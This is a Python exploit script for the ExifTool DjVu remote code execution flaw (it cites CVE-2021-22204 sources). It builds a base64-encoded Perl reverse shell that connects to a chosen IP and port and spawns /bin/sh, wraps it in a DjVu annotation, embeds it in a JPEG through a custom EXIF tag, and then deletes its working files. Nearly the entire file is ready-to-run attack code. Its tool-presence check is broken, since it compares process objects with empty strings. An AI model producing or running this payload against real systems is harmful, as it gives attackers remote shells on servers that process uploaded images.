#!/usr/bin/python3

import sys
import subprocess
import os
import base64
import pdb
from PIL import Image
from termcolor import cprint

#colors
printRed = lambda s: cprint(s, 'red', end=' ')
printYellow = lambda s: cprint(s, 'yellow', end=' ')
printMagenta = lambda s: cprint(s, 'magenta', end=' ')
printGreen = lambda s: cprint(s, 'green', end=' ')

#panel_help
def help():
    printYellow("\n[*] Uso : ")
    printMagenta(f"python3 {sys.argv[0]} <ip_address> <port>")
    exit(1)  

#valid_input
if len(sys.argv) != 3: help()

#check if djvumake and exiftool is installed
def checkTools():
    check_djvu = os.popen('which djvumake', 'r')
    check_exif = os.popen('which exiftool', 'r')
    if check_djvu == "":
        exit(printGreen("\n[!] djvumake not installed. Install by running command : sudo apt install djvulibre-bin"))
    elif check_exif == "":
            exit(printGreen("\n[!] exiftool not installed. Install by running command : sudo apt install exiftool"))
    elif check_exif == "" and check_djvu == "":
        exit(printGreen("\n[!] djvumake and exiftool not installed. Install by running command : sudo apt install djvulibre-bin exiftool"))
    else:
        return

#generate image
def create_image():
    img = Image.new('RGB', (50, 50), color='blue')
    img.save('payload.jpg')

#build the payload
def gen_payload(ip_address, port):
    payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"
    payload += base64.b64encode( set_shell(ip_address, port).encode() )
    payload += b"'))};\")"
    return payload

#Asign Shell
def set_shell(ip_address, port):
    reverse_shell = f'''use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip_address}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};'''
    return reverse_shell

#create payload_file
def gen_payload_file(payload):
    payload_file = open('payload', 'w')
    payload_file.write(payload.decode('utf-8'))
    payload_file.close()

#create config_file
def gen_config_file():
    filename = "configfile"
    content = '''%Image::ExifTool::UserDefined = (
        # All EXIF tags are added to the Main table, and WriteGroup is used to
        # specify where the tag is written (default is ExifIFD if not specified):
        'Image::ExifTool::Exif::Main' => {
            # Example 1.  EXIF:NewEXIFTag
            0xc51b => {
               Name => 'HasselbladExif',
               Writable => 'string',
               WriteGroup => 'IFD0',
            },
            # add more user-defined EXIF tags here...
       },
    );
    1; #end%
    '''
    with open(filename, 'w') as f:
        print(content, file=f)
    
#execute malicious image
def run():
    subprocess.run(['bzz', 'payload', 'payload.bzz'])
    subprocess.run(['djvumake', 'exploit.djvu', 'INFO=1,1', 'BGjp=/dev/null', 'ANTz=payload.bzz'])
    subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'payload.jpg'])

#remove others files
def remove_files():
    subprocess.run(['rm', 'configfile', 'exploit.djvu', 'payload', 'payload.bzz', 'payload.jpg_original'])

#main
if __name__ == '__main__':
    
    ip_address = sys.argv[1]
    port = sys.argv[2]
     
    checkTools()
    create_image()
    payload = gen_payload(ip_address, port)
    gen_config_file()
    gen_payload_file(payload)
    run()

    remove_files()



#References
#---------------------------------------------------------------------------------
#https://github.com/convisolabs/CVE-2021-22204-exiftool
#https://github.com/LazyTitan33/ExifTool-DjVu-exploit/blob/main/CVE-2021.22204.py
#https://github.com/CsEnox/Gitlab-Exiftool-RCE/blob/main/exploit.py 
